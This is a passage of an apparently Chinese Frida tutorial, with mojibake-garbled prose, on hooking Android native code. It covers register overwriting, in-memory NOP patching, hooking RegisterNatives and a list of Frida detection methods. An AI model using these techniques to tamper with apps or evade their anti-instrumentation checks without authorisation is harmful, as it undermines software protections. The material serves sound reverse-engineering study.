class="comment">//console.log(&quot;pointer :&quot;+pointer); è¿™å¥æ‰“å°çš„åœ°å€ ä¹Ÿå°±æ˜¯libcçš„åœ°å€</span></span><br><span class="line">pointer :<span class="number">0xf588f000</span></span><br><span class="line"><span class="comment">//console.log(buffer); è¾“å‡ºbuffer 0xf588f000åœ¨å†…å­˜æ•°æ®ä¼šä»¥00 f0 88 f5æ–¹å¼æ˜¾ç¤º</span></span><br><span class="line">           <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> f0 <span class="number">88</span> f5              </span><br></pre></td></tr></table></figure><h2 id="readPointer">readPointer()</h2><p>ä»æ­¤å†…å­˜ä½ç½®è¯»å–<code>NativePointer</code>ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ã€‚çœç•¥<code>function</code>ä»¥åŠ<code>Java.perform</code>~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pointer = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>).<span class="property">base</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pointer.<span class="title function_">readByteArray</span>(<span class="number">0x10</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;readPointer():&quot;</span>+pointer.<span class="title function_">readPointer</span>());</span><br><span class="line">è¾“å‡ºå¦‚ä¸‹ã€‚</span><br><span class="line"><span class="title function_">readPointer</span>():<span class="number">0x464c457f</span></span><br><span class="line"></span><br><span class="line">ä¹Ÿå°±æ˜¯å°†readPointerçš„å‰å››ä¸ªå­—èŠ‚çš„å†…å®¹è½¬æˆåœ°å€äº§ç”Ÿä¸€ä¸ªæ–°çš„<span class="title class_">NativePointer</span>ã€‚</span><br></pre></td></tr></table></figure><h2 id="Frida-API-å†™æ–‡ä»¶">Frida API å†™æ–‡ä»¶</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest12</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ios = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/sdcard/a.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    ios.<span class="title function_">write</span>(<span class="string">&quot;asdfg\n&quot;</span>);</span><br><span class="line">    ios.<span class="title function_">flush</span>();</span><br><span class="line">    ios.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-libc-so-å†™æ–‡ä»¶">Hook <a href="http://libc.so">libc.so</a> å†™æ–‡ä»¶</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest13</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//è·å¾—libcä¸­å¯¼å‡ºå‡½æ•°åœ°å€ </span></span><br><span class="line">    <span class="keyword">var</span> addr_fopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_fputs = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_fclose = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_fopen:&quot;</span>, addr_fopen, <span class="string">&quot;addr_fputs:&quot;</span>, addr_fputs, <span class="string">&quot;addr_fclose:&quot;</span>, addr_fclose);</span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fopen, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fputs, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fclose, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> filename = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/sdcard/a.txt&quot;</span>); <span class="comment">//å®šä¹‰ä¸€ä¸ªso å­—ç¬¦ä¸² æ–‡ä»¶å</span></span><br><span class="line">    <span class="keyword">var</span> open_mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> file = <span class="title function_">fopen</span>(filename, open_mode);  <span class="comment">//æ–‡ä»¶å¥æŸ„</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fopen:&quot;</span>, file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;asd\n&quot;</span>); <span class="comment">//å†™çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">var</span> retval = <span class="title function_">fputs</span>(buffer, file);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fputs:&quot;</span>, retval);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fclose</span>(file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="inlineHookä¸å¯„å­˜å™¨Hook">inlineHookä¸å¯„å­˜å™¨Hook</h2><p>arm64ä¸­ ç»“æœæ”¾åœ¨x0ä¸­ï¼Œ w0æ˜¯x0çš„ä½32ä½   inlinehookåœ¨64ä½ä¸‹æ¯”è¾ƒç¨³å®š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest14</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> sub_2894 = soAddr.<span class="title function_">add</span>(<span class="number">0x2894</span>); <span class="comment">//å‡½æ•°åœ°å€è®¡ç®— thumb+1 ARMä¸åŠ </span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_2894);</span><br><span class="line">    <span class="keyword">if</span>(sub_2894 != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_2894,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span> = <span class="number">0x1000</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sub_2858 = soAddr.<span class="title function_">add</span>(<span class="number">0x2858</span>); <span class="comment">//å‡½æ•°åœ°å€è®¡ç®— thumb+1 ARMä¸åŠ </span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_2858);</span><br><span class="line">    <span class="keyword">if</span>(sub_2858 != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_2858,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span> = soAddr.<span class="title function_">add</span>(<span class="number">0x2C35</span>); <span class="comment">//è®©è¿™ä¸ªæŒ‡é’ˆå‚æ•°æŒ‡å‘å¦ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fridaè¿›è¡Œå†…å­˜nop">fridaè¿›è¡Œå†…å­˜nop</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32ä½Thumb</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(<span class="title function_">ptr</span>(addr), <span class="number">4</span>, <span class="function"><span class="params">code</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(addr) &#125;);</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//64ä½</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(<span class="title function_">ptr</span>(addr), <span class="number">4</span>,</span><br><span class="line">            <span class="function"><span class="params">code</span>=&gt;</span>  &#123;</span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(addr) &#125;);</span><br><span class="line">        <span class="comment">// const cw = new ThumbWriter(code, &#123; pc: ptr(addr) &#125;);</span></span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nativeå±‚è°ƒç”¨æ ˆæ‰“å°">nativeå±‚è°ƒç”¨æ ˆæ‰“å°</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(f, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;RegisterNatives called from:\n&#x27;</span> +</span><br><span class="line">        <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>) <span class="comment">// æˆ–è€…Backtracer.FUZZY</span></span><br><span class="line">        .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Hook-RegisterNative">Hook RegisterNative</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_libart</span>(<span class="params"></span>) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> module_libart = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="comment">//æšä¸¾æ‰€æœ‰çš„æ–‡ä»¶æ¥æ‰¾åˆ°</span></span><br><span class="line">    <span class="comment">//é¦–å…ˆæ‰¾åˆ°so</span></span><br><span class="line">    <span class="keyword">var</span> symbols = module_libart.<span class="title function_">enumerateSymbols</span>();   </span><br><span class="line">     <span class="comment">//æšä¸¾æ¨¡å—çš„ç¬¦å·</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> addr_RegisterNatives = <span class="literal">null</span>;      </span><br><span class="line">     <span class="comment">// æ€ä¹ˆhook RegisterNatives</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = symbols[i].<span class="property">name</span>;</span><br><span class="line">        <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;art&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((name.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (name.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) &gt;= <span class="number">0</span>) &#123;<span class="comment">//æ‰¾åˆ°å‡½æ•°çš„åå­—</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    addr_RegisterNatives = symbols[i].<span class="property">address</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr_RegisterNatives) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr_RegisterNatives, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_RegisterNatives name:&quot;</span>, <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>())</span><br><span class="line">                <span class="comment">//å› ä¸ºRegisterNativeså‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°çš„ç±»å‹æ˜¯æŒ‡é’ˆç±»å‹ï¼Œæ‰€ä»¥è¦å…ˆptr().readPointer()å†è¯»å–å…¶ä¸­çš„å€¼</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_RegisterNatives sig:&quot;</span>, <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="comment">//å¢åŠ ä¸€ä¸ªæŒ‡é’ˆçš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšåˆšåˆ†æè¿‡ç¨‹ä¸­åŠ å¯†çš„é‚£ä¸€æ®µå­—ç¬¦ä¸²çš„å€¼ï¼Œ</span></span><br><span class="line">                <span class="comment">//æ³¨æ„ä¸€ä¸‹è¿™é‡Œä¸æ˜¯ç¬¬å››ä¸ªå‚æ•°ï¼Œå› ä¸ºè¿™é‡Œæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé¦–å…ˆæŒ‡å‘äº†ç¬¬ä¸‰ä¸ªå‚æ•°çš„åœ°å€ï¼Œç„¶åä»ç¬¬ä¸‰ä¸ªå‚æ•°çš„é‚£ç‰‡å†…å­˜åŒºåŸŸä¸­å¢åŠ äº†8ä¸ªé•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšé‚£æ®µåŠ å¯†çš„å­—ç¬¦ä¸²</span></span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>ä¸€äº›hookæ–¹æ³•è¡¥å……</h1><p>byte array to String</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">JavaString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="title class_">JavaString</span>.$new(<span class="string">&#x27;byte array&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•äºŒ</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line"><span class="comment">// è½¬æˆ hex åœ¨è½¬ string</span></span><br><span class="line"><span class="title class_">ByteString</span>.<span class="title function_">of</span>(<span class="string">&#x27;byte array&#x27;</span>).<span class="title function_">hex</span>();<span class="comment">//utf8()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºJava.choose()ä¸­å­˜åœ¨çš„å®ä¾‹</span></span><br><span class="line"><span class="title function_">getObjClassName</span>(instance) </span><br><span class="line"></span><br><span class="line"><span class="comment">//fridaå¯ä»¥é€šè¿‡$classNameæ‰“å°ç±»å‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å½“å‰çº¿ç¨‹id</span></span><br><span class="line"><span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>å½“å‚æ•°æ˜¯listæ—¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‰“å°è¿™ä¸ªå‚æ•°</span></span><br><span class="line"><span class="keyword">var</span> arrays = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.Arrays&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;content: &#x27;</span> + arrays.<span class="title function_">toString</span>(args.<span class="title function_">toArray</span>()));</span><br></pre></td></tr></table></figure><p><strong>fridaä¸­å®ç° å®˜æ–¹çš„ä¿å­˜å›¾ç‰‡æ–¹æ³•</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path=<span class="string">&quot;/sdcard/Download/tmp/&quot;</span>+<span class="title function_">guid</span>()+<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(path);</span><br><span class="line"><span class="keyword">var</span> fos = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line"><span class="title class_">Bitmap</span>_Obj.<span class="title function_">compress</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.Bitmap$CompressFormat&quot;</span>).<span class="property">JPEG</span>.<span class="property">value</span>,<span class="number">100</span>,fos);</span><br><span class="line">fos.<span class="title function_">flush</span>();</span><br><span class="line">fos.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure><p><strong>hextobytes</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> bytes = [], c = <span class="number">0</span>; c &lt; hex.<span class="property">length</span>; c += <span class="number">2</span>)</span><br><span class="line">        bytes.<span class="title function_">push</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(c, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br></pre></td></tr></table></figure><h1>frida Stalker Trace</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stalker<span class="selector-class">.follow</span>(<span class="selector-attr">[threadId, options]</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>fridaæ£€æµ‹</h1><p>â€“bç«™ ã€ŠFridaç‰¹å¾æ£€æµ‹ä¹‹é«˜ç»´å¯¹æŠ—èŠ‚ã€‹</p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1921073">ã€Šå®‰å“é€†å‘è¿™æ¡£äº‹ã€‹åå…«ã€è¡¨å“¥ï¼Œä½ ä¹Ÿä¸æƒ³ä½ çš„Fridaè¢«æ£€æµ‹å§!(ä¸Š) - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p><strong>r0trace</strong>ï¼šå®‰å“Javaå±‚å¤šåŠŸèƒ½è¿½è¸ªè„šæœ¬</p><p>å‡ ç§æ£€æµ‹æ–¹æ³•ï¼š</p><ul><li>Fridaç«¯å£æ‰«æ åŠå…³é”®æ–‡ä»¶/data/local/tmpä¸‹æ˜¯å¦æœ‰frdia-server</li><li>çº¿ç¨‹æ£€æµ‹</li><li>Mapsè®°å½•æ£€æŸ¥ è¿›å…¥è¿›ç¨‹å·è·¯å¾„å cat Mapsã€‚fridaæ³¨å…¥åmapsæ–‡ä»¶ä¸‹ä¼šæœ‰frida-agent-64.so<code>ã€</code>frida-agent-32.soç­‰æ–‡ä»¶</li><li>fdæ£€æµ‹ è¿›ç¨‹åè·¯å¾„ä¸‹ cd fdï¼Œcat 0<br>/proc/pid/fd ç›®å½•çš„ä½œç”¨åœ¨äºæä¾›äº†ä¸€ç§æ–¹ä¾¿çš„æ–¹å¼æ¥æŸ¥çœ‹è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ä¿¡æ¯ï¼Œè¿™å¯¹äºè°ƒè¯•å’Œç›‘æ§è¿›ç¨‹éå¸¸æœ‰ç”¨ã€‚é€šè¿‡æŸ¥çœ‹æ–‡ä»¶æè¿°ç¬¦ä¿¡æ¯ï¼Œå¯ä»¥äº†è§£è¿›ç¨‹æ‰“å¼€äº†å“ªäº›æ–‡ä»¶ã€ç½‘ç»œè¿æ¥ç­‰ï¼Œå¸®åŠ©å¼€å‘è€…å’Œç³»ç»Ÿç®¡ç†å‘˜è¿›è¡Œé—®é¢˜æ’æŸ¥å’Œåˆ†æå·¥ä½œã€‚</li><li>TraceçŠ¶æ€æ£€æµ‹  è¿›å…¥è¿›ç¨‹å·è·¯å¾„å cat status å½“ç„¶statuså¯èƒ½ä¹Ÿæœ‰fridaç‰¹å¾ä¿¡æ¯ï¼Œå¦‚gmainã€pool-fridaã€gdbus</li><li>å†…å­˜ç‰¹å¾æ£€æµ‹</li><li>å¯¹fridaçš„æ£€æµ‹é€šå¸¸ä¼šä½¿ç”¨openatã€openã€strstrã€pthread_createã€snprintfã€sprintfã€readlinkatç­‰ä¸€ç³»åˆ—å‡½æ•°ï¼Œ</li><li>ptraceå å‘ä½ï¼Œå½“appä¸»åŠ¨é™„åŠ è‡ªèº«è¿›ç¨‹æ—¶ï¼Œæ³¨å…¥å°±ä¼šæç¤º<code>run frida as root</code>è¿™æ˜¯å› ä¸ºä¸€ä¸ªè¿›ç¨‹åªèƒ½<code>ptraceä¸€æ¬¡ æ‰§è¡Œfrida -U -f åŒ…å -l 